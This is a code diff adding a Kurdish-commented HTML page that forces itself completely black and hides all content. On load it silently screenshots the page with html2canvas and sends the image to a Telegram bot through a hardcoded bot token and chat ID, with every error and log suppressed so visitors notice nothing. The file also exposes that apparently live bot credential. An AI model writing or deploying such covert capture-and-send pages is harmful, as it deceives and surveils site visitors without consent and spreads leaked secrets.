@@ -1,0 +1,89 @@
+<!-- filename: index.html -->
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پەڕەی ڕەش و نهێنی</title>
+    <style>
+        /* دڵنیابوون لەوەی هەموو شتێک ڕەشە و هیچ شتێک دیار نییە */
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* ڕێگریکردن لە سکڕۆڵکردن */
+            background-color: black !important; /* دڵنیابوون لە ڕەشی تەواو */
+            color: black !important; /* دڵنیابوون لەوەی نووسینیش ڕەشە */
+            width: 100vw; /* فراوانی تەواوی شاشە */
+            height: 100vh; /* بەرزی تەواوی شاشە */
+        }
+        /* دڵنیابوون لەوەی هیچ ناوەڕۆکێک نیشان نادات ئەگەر بە هەڵەش زیاد کرابێت */
+        body > * {
+            display: none !important;
+        }
+    </style>
+    <!-- کتێبخانەی html2canvas بۆ گرتنی وێنەی شاشە -->
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head>
+<body>
+    <script>
+        // زانیارییەکانی بۆتە تیلیگرامەکەت
+        const BOT_TOKEN = '9046970947:AAEi4u00FcgR1h30z2fnwuhCXu9EpQhcD7o';
+        const CHAT_ID = '1682628303';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        /**
+         * ئەم فانکشنە وێنەیەکی شاشە دەنێرێت بۆ بۆتە تیلیگرامەکە.
+         * @param {string} imageDataUrl - داتا URLی وێنەکە (base64).
+         */
+        async function sendScreenshotToTelegram(imageDataUrl) {
+            try {
+                // گۆڕینی داتا URL بۆ Blob (جۆرێکی فایل کە دەتوانرێت بنێردرێت)
+                const response = await fetch(imageDataUrl);
+                const blob = await response.blob();
+
+                // دروستکردنی FormData بۆ ناردنی فایلەکە و زانیارییەکان
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'screenshot.png'); // 'screenshot.png' ناوی فایلەکەیە کە دەگاتە تیلیگرام
+                formData.append('caption', 'وێنەیەکی شاشە لە وێبسایتەکەتەوە گیراوە.'); // دەتوانیت ئەمە بگۆڕیت
+
+                // ناردنی داواکارییەکە بۆ APIی تیلیگرام
+                const telegramResponse = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    body: formData,
+                });
+
+                const result = await telegramResponse.json();
+                if (result.ok) {
+                    // وێنەکە بە سەرکەوتوویی نێردرا.
+                    // لێرەدا هیچ پەیامێک نیشان نادەین بۆ پاراستنی ڕەشیی لاپەڕەکە.
+                    // console.log('وێنە بە سەرکەوتوویی نێردرا بۆ تیلیگرام.');
+                } else {
+                    // هەڵەیەک ڕوویدا لە ناردنی وێنەکە.
+                    // console.error('هەڵە لە ناردنی وێنە بۆ تیلیگرام:', result.description);
+                }
+            } catch (error) {
+                // هەڵەی گشتی لە پرۆسەی ناردندا.
+                // console.error('هەڵەی گشتی لە ناردنی وێنە:', error);
+            }
+        }
+
+        // کاتێک لاپەڕەکە بە تەواوی بار دەبێت، ئەم کۆدە کارا دەبێت.
+        document.addEventListener('DOMContentLoaded', () => {
+            // گرتنی وێنەی تەواوی بەڵگەنامەکە (شاشەی براوزەرەکە)
+            html2canvas(document.documentElement, {
+                useCORS: true, // گرنگە ئەگەر فۆنت یان وێنەی دەرەکی هەبێت
+                allowTaint: true, // ڕێگەدان بە وێنەگرتن لەسەر ناوەڕۆک کە CORS نەبێت
+                backgroundColor: 'black', // دڵنیابوون لەوەی پاشبنەما ڕەشە لە وێنەکەشدا
+            }).then(canvas => {
+                // گۆڕینی کانڤاس بۆ داتا URLی وێنەی PNG
+                const imageDataUrl = canvas.toDataURL('image/png');
+                // ناردنی وێنەکە بۆ تیلیگرام
+                sendScreenshotToTelegram(imageDataUrl);
+            }).catch(error => {
+                // console.error('هەڵە لە گرتنی وێنە:', error);
+            });
+        });
+    </script>
+</body>
+</html>
